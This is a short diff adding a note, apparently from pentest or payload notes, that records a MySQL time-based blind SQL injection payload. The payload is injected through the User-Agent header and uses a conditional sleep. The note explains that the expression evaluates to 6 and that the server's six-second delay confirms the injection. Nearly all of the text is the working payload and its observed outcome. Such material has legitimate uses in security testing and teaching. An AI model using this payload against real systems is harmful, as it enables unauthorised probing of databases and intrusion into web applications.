@@ -1,0 +1,6 @@
+-MySQL
+
+1. User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
+This time the payload contains 6*6-30 that is equal with 6. The server responded after 6 seconds.
+
+
